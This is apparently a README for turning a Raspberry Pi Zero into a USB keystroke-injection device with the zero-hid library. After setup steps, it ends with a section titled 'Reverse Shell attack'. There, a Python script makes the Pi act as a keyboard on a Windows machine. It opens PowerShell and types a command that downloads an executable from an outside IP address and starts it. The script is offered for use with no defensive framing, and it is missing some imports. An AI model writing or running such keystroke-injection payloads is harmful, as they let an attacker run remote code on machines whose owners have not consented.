# Requirements

- Raspberry Pi Zero
- Micro usb to usb A adapter
- (optional) [Micro usb to usb A dongle](https://52pi.com/collections/raspberry-pi-zero/products/52pi-usb-dongle-for-raspberry-pi-zero-zero-w)

# Setup

- Install [Raspberry Pi Imager](https://www.raspberrypi.com/software/)
- Flash the OS into a SD card using Raspberry Pi Imager
- Insert the SD card into the PI
- Get the Pi's ip by accessing the routers domain and ssh into the device 
- Install apt dependencies
```
sudo apt-get update
sudo apt-get install -y git vim python3-pip python3-venv
```
- init rc-local file
```
sudo bash -c 'echo "#!/bin/bash" > /etc/rc.local'
sudo bash -c 'echo "exit 0" >> /etc/rc.local'   
sudo chmod +x /etc/rc.local
sudo systemctl daemon-reload
sudo systemctl enable rc-local
sudo systemctl start rc-local
```
- setup usb gadget module
```
git clone https://github.com/thewh1teagle/zero-hid
cd zero-hid/usb_gadget
sudo ./installer
```
- add sudo to the file line added by the script
- Create virtual environment and install module
```
python3 -m venv ~/venv
source ~/venv/bin/activate
pip3 install zero-hid
sudo reboot
```
# Reverse Shell attack

```python
from zero_hid import Keyboard


with Keyboard() as k:
    k.press([KeyCodes.MOD_LEFT_GUI], KeyCodes.KEY_R)
    sleep(2)
    k.type("powershell")
    k.press([], KeyCodes.KEY_ENTER)
    sleep(2)
    k.type("Invoke-WebRequest -Uri http://192.168.1.140:3232/4ac5d816227cbfba9580a510af5272e2 -OutFile test.exe; Start-Process .\\test.exe")
```

